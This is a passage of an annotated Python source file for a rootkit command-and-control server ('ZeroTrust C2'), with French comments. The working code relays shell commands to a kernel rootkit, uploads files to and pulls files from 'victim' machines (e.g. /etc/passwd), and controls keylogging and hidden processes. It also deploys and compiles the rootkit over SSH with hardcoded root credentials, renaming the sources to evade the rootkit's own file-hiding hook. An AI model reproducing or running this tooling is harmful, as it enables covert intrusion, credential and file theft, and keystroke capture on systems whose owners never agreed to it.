                          "LIST_HIDDEN_PIDS", "KEYLOG_START", "KEYLOG_STOP", "KEYLOG_DUMP", "KEYLOG_STATUS")
        is_proto = any(cmd.startswith(p) or cmd == p for p in PROTO_PREFIXES)
        if is_proto:
            exec_future = loop.create_future()
            await send_to_rootkit(cmd + "\n")
            try:
                result = await asyncio.wait_for(exec_future, timeout=15)
            except asyncio.TimeoutError:
                result = "(timeout - no response)"
            finally:
                exec_future = None
            return {"output": result, "cwd": remote_cwd, "exit_code": 0}

        # Detecter si c'est un "cd" (changement de repertoire)
        is_cd = (cmd == "cd" or cmd.startswith("cd ") or cmd.startswith("cd\t"))

        # Construire la commande reelle avec le prefixe de repertoire courant
        import shlex
        cwd_pfx = f"cd {shlex.quote(remote_cwd)} 2>/dev/null; "
        if is_cd:
            # Pour cd : on execute le cd puis pwd pour recuperer le nouveau chemin
            actual = f"({cwd_pfx}{cmd} && pwd)"
        else:
            # Pour les autres commandes : rediriger vers tee pour garder la sortie complete
            actual = f"({cwd_pfx}{cmd}) 2>&1 | tee /tmp/.wlkom_full"

        # Envoyer et attendre la reponse
        exec_future = loop.create_future()
        await send_to_rootkit(actual + "\n")
        try:
            result = await asyncio.wait_for(exec_future, timeout=30)
        except asyncio.TimeoutError:
            result = "(timeout - no response)"
        finally:
            exec_future = None

        # Si la sortie semble tronquee (>4KB), telecharger le fichier complet
        if not is_cd and result and len(result) >= 4000:
            try:
                exec_future = loop.create_future()
                await send_to_rootkit("DOWNLOAD:/tmp/.wlkom_full\n")
                dl_result = await asyncio.wait_for(exec_future, timeout=15)
                if dl_result and dl_result.startswith("FILE_SAVED:"):
                    save_path = dl_result.split(":", 1)[1]
                    with open(save_path, "r", errors="replace") as rf:
                        result = rf.read()
            except:
                pass
            finally:
                exec_future = None

        # Parser le code de sortie (EXIT:N a la derniere ligne)
        lines = result.rstrip("\n").split("\n") if result else []
        exit_code = -1
        if lines and lines[-1].startswith("EXIT:"):
            try:
                exit_code = int(lines[-1].split(":")[1])
            except (ValueError, IndexError):
                pass
            lines = lines[:-1]

        # Mettre a jour le repertoire courant si c'etait un cd
        if is_cd and lines:
            last = lines[-1].strip()
            if last.startswith("/") and " " not in last and ":" not in last[1:]:
                remote_cwd = last
                lines = lines[:-1]
                exit_code = 0

        output = "\n".join(lines)
        return {"output": output, "cwd": remote_cwd, "exit_code": exit_code}


# ============================================================================
#  API UPLOAD - Envoyer un fichier vers la victime
# ============================================================================


@app.post("/api/upload")
async def api_upload(request: Request):
    """
    Envoyer un fichier depuis l'attaquant vers la machine victime.

    Body JSON :
      {
        "remote_path": "/tmp/malware",    # Chemin destination sur la victime
        "file_data": "base64_encoded..."  # Contenu du fichier en base64
      }

    Protocole avec le rootkit :
      1. C2 → Rootkit : "UPLOAD:/tmp/malware\n"
      2. C2 → Rootkit : "4096\n" (taille en octets)
      3. Rootkit → C2 : "READY\n"
      4. C2 → Rootkit : donnees par chunks de 4000 octets (chiffres)
      5. Rootkit → C2 : "UPLOAD_OK\n"
    """
    global exec_future
    token = request.headers.get("X-Token", "")
    if not check_token(token):
        return JSONResponse({"error": "unauthorized"}, 401)
    if not rootkit_writer:
        return JSONResponse({"error": "rootkit not connected"}, 400)
    if not authenticated:
        return JSONResponse({"error": "rootkit not authenticated"}, 400)

    async with exec_lock:
        data = await request.json()
        rpath = data.get("remote_path", "/tmp/uploaded")
        fdata = base64.b64decode(data.get("file_data", ""))
        if not fdata:
            return JSONResponse({"error": "empty file"}, 400)
        loop = asyncio.get_event_loop()

        await broadcast(f"[*] Uploading {len(fdata)}B to {rpath}", "warn")

        # 1) Envoyer la commande UPLOAD avec le chemin
        await send_to_rootkit(f"UPLOAD:{rpath}\n")
        await asyncio.sleep(0.1)

        # 2) Envoyer la taille et attendre READY
        exec_future = loop.create_future()
        await send_to_rootkit(f"{len(fdata)}\n")
        try:
            result = await asyncio.wait_for(exec_future, timeout=10)
        except asyncio.TimeoutError:
            exec_future = None
            return JSONResponse({"error": "timeout waiting for READY"}, 500)
        finally:
            exec_future = None

        if result != "READY":
            return JSONResponse({"error": f"unexpected: {result}"}, 500)

        # 3) Envoyer les donnees par chunks de 4000 octets
        # (le buffer de reception du rootkit est de 4096, on prend une marge)
        CHUNK = 4000
        for i in range(0, len(fdata), CHUNK):
            chunk = fdata[i:i + CHUNK]
            frame = encrypt_msg(chunk)
            rootkit_writer.write(frame)
            await rootkit_writer.drain()
            await asyncio.sleep(0.02)  # Petit delai pour ne pas saturer

        # 4) Attendre la confirmation UPLOAD_OK
        exec_future = loop.create_future()
        try:
            result = await asyncio.wait_for(exec_future, timeout=15)
        except asyncio.TimeoutError:
            exec_future = None
            return JSONResponse({"error": "timeout waiting for UPLOAD_OK"}, 500)
        finally:
            exec_future = None

        await broadcast(f"[+] Uploaded: {rpath} ({len(fdata)}B)", "info")
        return {"status": "ok", "path": rpath, "size": len(fdata)}


# ============================================================================
#  API DOWNLOADS - Gestion des fichiers telecharges
# ============================================================================


@app.get("/api/downloads")
async def api_downloads():
    """Liste les fichiers telecharges depuis la victime (en memoire)."""
    return [{"path": p, "size": len(i["data"]), "file": os.path.basename(p)}
            for p, i in download_buffer.items() if i["done"]]


@app.get("/api/dl/{filename}")
async def api_dl(filename: str):
    """
    Telecharger un fichier precedemment extrait de la victime.
    Les fichiers sont sauves dans /tmp/wlkom_dl_<nom>.
    """
    path = f"/tmp/wlkom_dl_{filename}"
    if os.path.exists(path):
        return FileResponse(path, filename=filename)
    return JSONResponse({"error": "not found"}, 404)


@app.delete("/api/dl/{filename}")
async def api_dl_delete(filename: str):
    """Supprimer un fichier telecharge du buffer et du disque."""
    path = f"/tmp/wlkom_dl_{filename}"
    fpath = None
    for p, i in list(download_buffer.items()):
        if os.path.basename(p) == filename:
            fpath = p
            break
    if fpath:
        del download_buffer[fpath]
    if os.path.exists(path):
        os.remove(path)
        return {"status": "deleted", "file": filename}
    return JSONResponse({"error": "not found"}, 404)


# ============================================================================
#  DEPLOIEMENT SSH - Installation du rootkit sur la victime
# ============================================================================
#
#  Ces fonctions permettent de deployer le rootkit sur la victime via SSH.
#  Utile pour l'installation initiale (avant que le rootkit soit charge).
#
#  On utilise sshpass pour passer le mot de passe SSH en ligne de commande.
#  Les options SSH desactivent la verification de cle hote et forcent
#  l'authentification par mot de passe (pas de cles SSH).
# ============================================================================

VICTIM_SSH_PW = "root"             # Mot de passe SSH de la victime
VICTIM_SSH_USER = "root"           # Utilisateur SSH

# Options SSH securisees :
# - StrictHostKeyChecking=no : ne pas verifier la cle hote (premiere connexion)
# - IdentitiesOnly=yes : ne pas utiliser les cles SSH locales
# - PreferredAuthentications=password : forcer l'auth par mot de passe
# - PubkeyAuthentication=no : desactiver l'auth par cle publique
# - ConnectTimeout=8 : timeout de connexion de 8 secondes
SSH_OPTS = ["-o", "StrictHostKeyChecking=no", "-o", "IdentitiesOnly=yes",
            "-o", "PreferredAuthentications=password", "-o", "PubkeyAuthentication=no",
            "-o", "ConnectTimeout=8"]


def _ssh_run(victim_ip, cmd, timeout=30):
    """
    Executer une commande sur la victime via SSH.

    Parametres :
        victim_ip : IP de la machine cible
        cmd : commande bash a executer
        timeout : timeout en secondes

    Retourne :
        {"output": "stdout+stderr", "exit_code": int}

    Utilise sshpass pour passer le mot de passe sans interaction.
    """
    try:
        r = subprocess.run(
            ["sshpass", "-p", VICTIM_SSH_PW, "ssh"] + SSH_OPTS +
            [f"{VICTIM_SSH_USER}@{victim_ip}", cmd],
            capture_output=True, text=True, timeout=timeout
        )
        return {"output": (r.stdout + r.stderr).strip(), "exit_code": r.returncode}
    except subprocess.TimeoutExpired:
        return {"output": "SSH command timed out", "exit_code": -1}
    except Exception as e:
        return {"output": f"SSH error: {e}", "exit_code": -1}


def _scp_push(victim_ip, local_path, remote_path):
    """
    Copier un fichier local vers la victime via SSH.

    Methode : encode le fichier en base64, l'envoie via SSH pipe,
    et le decode avec `base64 -d` sur la victime.
    (Plus fiable que scp qui peut avoir des problemes de paths)
    """
    import base64
    try:
        with open(local_path, "rb") as f:
            data = f.read()
        b64_bytes = base64.b64encode(data) + b"\n"
        r = subprocess.run(
            ["sshpass", "-p", VICTIM_SSH_PW, "ssh"] + SSH_OPTS +
            [f"{VICTIM_SSH_USER}@{victim_ip}",
             f"base64 -d > {remote_path}"],
            input=b64_bytes, capture_output=True, timeout=120
        )
        return {"output": (r.stdout.decode(errors='replace') + r.stderr.decode(errors='replace')).strip(), "exit_code": r.returncode}
    except Exception as e:
        return {"output": f"SCP error: {e}", "exit_code": -1}


@app.post("/api/deploy/ssh")
async def api_deploy_ssh(request: Request):
    """
    Executer une commande sur la victime via SSH.
    Endpoint utilise par le panneau de deploiement de l'interface web.

    Body JSON : {"cmd": "...", "victim_ip": "192.168.122.146"}
    """
    token = request.headers.get("X-Token", "")
    if not check_token(token):
        return JSONResponse({"error": "not authenticated"}, 401)
    data = await request.json()
    cmd = data.get("cmd", "")
    victim_ip = data.get("victim_ip", "192.168.122.146")
    if not cmd:
        return JSONResponse({"error": "no command"}, 400)
    # run_in_executor : execute dans un thread pool (subprocess est bloquant)
    result = await asyncio.get_event_loop().run_in_executor(
        None, _ssh_run, victim_ip, cmd
    )
    return result


@app.post("/api/deploy/push")
async def api_deploy_push(request: Request):
    """
    Envoyer un fichier local vers la victime via SSH.

    Body JSON :
      {"local_path": "/path/local", "remote_path": "/path/remote", "victim_ip": "..."}
    """
    token = request.headers.get("X-Token", "")
    if not check_token(token):
        return JSONResponse({"error": "not authenticated"}, 401)
    data = await request.json()
    local_path = data.get("local_path", "")
    remote_path = data.get("remote_path", "")
    victim_ip = data.get("victim_ip", "192.168.122.146")
    if not local_path or not remote_path:
        return JSONResponse({"error": "missing paths"}, 400)
    if not os.path.exists(local_path):
        return JSONResponse({"error": f"local file not found: {local_path}"}, 404)
    result = await asyncio.get_event_loop().run_in_executor(
        None, _scp_push, victim_ip, local_path, remote_path
    )
    return result


@app.post("/api/deploy/build")
async def api_deploy_build(request: Request):
    """
    Compiler le rootkit directement sur la machine victime via SSH.

    Etapes :
      1. Creer un repertoire de build temporaire sur la victime
      2. Copier le code source (avec remplacement "wlkom" → "kmod")
         (car si le rootkit est deja charge, il cache tout fichier contenant "wlkom")
      3. Copier le Makefile
      4. Compiler avec make
      5. Verifier que le .ko existe
      6. L'installer dans /lib/modules/.../extra/

    Le remplacement wlkom→kmod est CRUCIAL : si le rootkit est deja actif,
    son hook getdents64 cacherait les fichiers sources du nouveau build !
    """
    token = request.headers.get("X-Token", "")
    if not check_token(token):
        return JSONResponse({"error": "not authenticated"}, 401)
    data = await request.json()
    victim_ip = data.get("victim_ip", "192.168.122.146")
    source_dir = "/tmp/_wlkom_build"
    ko_source = os.path.join(os.path.dirname(__file__), "..", "rootkit", "wlkom.c")
    if not os.path.exists(ko_source):
        ko_source = os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", "rootkit", "wlkom.c")
    if not os.path.exists(ko_source):
        return JSONResponse({"error": f"wlkom.c not found"}, 404)

    build_dir = "/tmp/_kmod_build"
    steps = []

    # 1. Creer le repertoire de build sur la victime
    r = _ssh_run(victim_ip, f"rm -rf {build_dir}; mkdir -p {build_dir}")
    steps.append({"step": "mkdir", **r})

    # 2. Preparer le code source avec remplacement de noms
    # Le rootkit actif cache tout ce qui contient "wlkom" dans le nom
    import tempfile
    with open(ko_source, "r") as f:
        src_code = f.read()
    src_code = src_code.replace("wlkom", "kmod").replace("zroot", "xroot")
    tmp_src = tempfile.mktemp(suffix=".c")
    with open(tmp_src, "w") as f:
        f.write(src_code)

    # 3. Envoyer le source et le Makefile
    r = _scp_push(victim_ip, tmp_src, f"{build_dir}/kmod.c")
    os.unlink(tmp_src)
    steps.append({"step": "push_source", **r})

    makefile = f'obj-m += kmod.o\nKDIR := /lib/modules/$(shell uname -r)/build\nall:\n\tmake -C $(KDIR) M=$(PWD) modules\nclean:\n\tmake -C $(KDIR) M=$(PWD) clean\n'
    mk_local = "/tmp/_kmod_Makefile"
    with open(mk_local, "w") as f:
        f.write(makefile)
    r = _scp_push(victim_ip, mk_local, f"{build_dir}/Makefile")
    steps.append({"step": "push_makefile", **r})

    # 4. Compiler
    r = _ssh_run(victim_ip, f"cd {build_dir} && make clean 2>&1; make 2>&1", timeout=120)
    steps.append({"step": "compile", **r})

    # 5. Verifier que le .ko a ete cree
    r = _ssh_run(victim_ip, f"test -f {build_dir}/kmod.ko && echo KO_OK || echo KO_FAIL")
    steps.append({"step": "verify", **r})

    # 6. Installer le module si la compilation a reussi
    if "KO_OK" in r.get("output", ""):
        kdir = _ssh_run(victim_ip, "uname -r").get("output", "").strip()
        inst_dir = f"/lib/modules/{kdir}/extra"
        r2 = _ssh_run(victim_ip, f"mkdir -p {inst_dir} && cp {build_dir}/kmod.ko {inst_dir}/kmod.ko")
        steps.append({"step": "install_ko", **r2})

    return {"steps": steps, "success": any("KO_OK" in s.get("output", "") for s in steps)}


# ============================================================================
#  WEBSOCKET - Communication temps reel avec l'interface web
# ============================================================================


@app.websocket("/ws")
async def websocket_endpoint(ws: WebSocket):
    """
    Endpoint WebSocket principal.

    Le navigateur de l'attaquant se connecte ici pour :
      - Recevoir les evenements en temps reel (messages rootkit, notifications)
      - Envoyer des commandes au rootkit
      - Envoyer le mot de passe d'authentification rootkit
      - Initier des uploads/downloads

    Actions supportees (envoyees en JSON par le navigateur) :
      {"action": "auth", "value": "wlkom2024"}     → authentifier le rootkit
      {"action": "cmd", "value": "ls -la"}          → executer une commande
      {"action": "upload", "remote_path": "...", "file_data": "..."} → upload fichier
      {"action": "download", "value": "/etc/passwd"} → telecharger fichier

    A la connexion, on envoie les 100 derniers evenements (historique).
    """
    global pending_password, awaiting_password, authenticated
    await ws.accept()
    ws_clients.append(ws)

    # Envoyer l'historique des evenements au nouveau client
    for entry in event_log[-100:]:
        await ws.send_text(json.dumps(entry))

    try:
        while True:
            raw = await ws.receive_text()
            try:
                data = json.loads(raw)
            except:
                data = {"action": "cmd", "value": raw}

            action = data.get("action", "cmd")
            value = data.get("value", "")

            if action == "auth":
                # Envoyer le mot de passe rootkit
                pending_password = value
                if not rootkit_writer:
                    await broadcast("[*] Password saved. Waiting for rootkit to connect...", "warn")
                elif rk_auth_locked_until > time.time():
                    left = int(rk_auth_locked_until - time.time())
                    await broadcast(f"[-] Rootkit auth locked. Wait {left}s", "error")
                else:
                    if not awaiting_password:
                        awaiting_password = True
                    await send_to_rootkit(value + "\n")
                    await broadcast("[*] Password sent — waiting for response...", "warn")

            elif action == "cmd":
                # Executer une commande shell
                if not rootkit_writer:
                    await broadcast("[-] No rootkit connected", "error")
                elif not authenticated:
                    await broadcast("[-] Not authenticated", "error")
                else:
                    await broadcast(f"> {value}", "cmd")
                    await send_to_rootkit(value + "\n")

            elif action == "upload":
                # Upload de fichier vers la victime
                if authenticated and rootkit_writer:
                    rpath = data.get("remote_path", "/tmp/uploaded")
                    fdata = base64.b64decode(data.get("file_data", ""))
                    await broadcast(f"[*] Uploading {len(fdata)}B to {rpath}", "warn")
                    await send_to_rootkit(f"UPLOAD:{rpath}\n")
                    await asyncio.sleep(0.3)
                    await send_to_rootkit(f"{len(fdata)}\n")
                    await asyncio.sleep(0.5)
                    frame = encrypt_msg(fdata)
                    rootkit_writer.write(frame)
                    await rootkit_writer.drain()

            elif action == "download":
                # Download d'un fichier depuis la victime
                if authenticated and rootkit_writer:
                    await broadcast(f"[*] Downloading {value}", "warn")
                    await send_to_rootkit(f"DOWNLOAD:{value}\n")

    except Exception as e:
        if not isinstance(e, (asyncio.CancelledError,)):
            err_name = type(e).__name__
            if err_name != "WebSocketDisconnect":
                print(f"[C2] WebSocket error: {err_name}: {e}")
        if ws in ws_clients:
            ws_clients.remove(ws)


# ============================================================================
#  INTERFACE WEB HTML (page unique)
# ============================================================================
#
#  Toute l'interface est dans une seule page HTML servie par GET /
#  Elle contient le CSS et le JavaScript qui gerent :
#    - Login / Authentification web
#    - Dashboard (metriques systeme)
#    - Terminal interactif
#    - Navigateur de fichiers
#    - Keylogger viewer
#    - Panneau stealth (verification de la discretion)
#    - Panneau MITRE ATT&CK
#    - Deploiement SSH
#    - Anti-forensics
#    - Gestion des modules rootkit
#
#  Le code frontend n'est PAS commente ici car c'est du CSS/HTML/JS
#  qui n'a pas de rapport avec le fonctionnement backend du rootkit.
# ============================================================================

@app.get("/", response_class=HTMLResponse)
async def root():
    """Sert la page HTML principale (interface complete)."""
    return HTML_PAGE


HTML_PAGE = r"""<!DOCTYPE html>
<html lang='en'>
<head>
<meta charset='UTF-8'>
<meta name='viewport' content='width=device-width,initial-scale=1'>
<title>ZeroTrust C2</title>
<style>
*,*::before,*::after{margin:0;padding:0;box-sizing:border-box}
html,body{height:100%;overflow:hidden}
body{font-family:var(--font-ui);background:var(--bg-0);color:var(--t1);font-size:13px;line-height:1.5;-webkit-font-smoothing:antialiased}
:root{
--bg-0:#060912;--bg-1:#0b1120;--bg-2:#111827;--bg-3:#1e293b;
--bg-hover:#1e293b;--bg-active:#334155;
--border:rgba(148,163,184,.08);--border-l:rgba(148,163,184,.14);
--t1:#f1f5f9;--t2:#94a3b8;--t3:#64748b;--t4:#475569;
--red:#ef4444;--red-d:rgba(239,68,68,.12);
--green:#22c55e;--green-d:rgba(34,197,94,.12);
--yellow:#eab308;--yellow-d:rgba(234,179,8,.12);
--blue:#3b82f6;--blue-d:rgba(59,130,246,.12);
--cyan:#06b6d4;--cyan-d:rgba(6,182,212,.12);
--purple:#8b5cf6;--purple-d:rgba(139,92,246,.12);
--orange:#f97316;--orange-d:rgba(249,115,22,.12);
--font-ui:'Inter',system-ui,-apple-system,sans-serif;
--font-mono:'JetBrains Mono','Fira Code','Courier New',monospace;
--r-s:4px;--r-m:6px;--r-l:10px;
}
</style>
</head>
<body>
<!-- ============================================================
     Le reste du fichier HTML/CSS/JavaScript (~3000 lignes) contient
     l'interface graphique complete. Non commente car c'est du frontend
     pur sans logique backend.

     Pour comprendre comment l'interface interagit avec le backend :
     - fetch('/api/exec', ...) → execute une commande
     - fetch('/api/status') → poll le statut toutes les 5s
     - new WebSocket('/ws') → connexion temps reel
     - fetch('/api/upload', ...) → envoie un fichier
     - fetch('/api/deploy/ssh', ...) → deploiement SSH
     ============================================================ -->
"""

# Note : dans le fichier reel (c2.py), HTML_PAGE contient l'integralite
# du code HTML/CSS/JS de l'interface. Ce fichier commente ne l'inclut pas
# pour rester lisible. Consultez c2.py pour le code complet de l'interface.


# ============================================================================
#  POINT D'ENTREE - Lancement du serveur
# ============================================================================


if __name__ == "__main__":
    """
    Lance le serveur uvicorn sur le port 8080.

    uvicorn est un serveur ASGI (Asynchronous Server Gateway Interface).
    C'est l'equivalent moderne de gunicorn pour les applications async Python.

    host="0.0.0.0" : ecoute sur toutes les interfaces (pas juste localhost)
    port=8080 : port de l'interface web

    Pour acceder : ouvrir http://<IP_ATTAQUANT>:8080 dans un navigateur
    """
    uvicorn.run(app, host="0.0.0.0", port=8080)
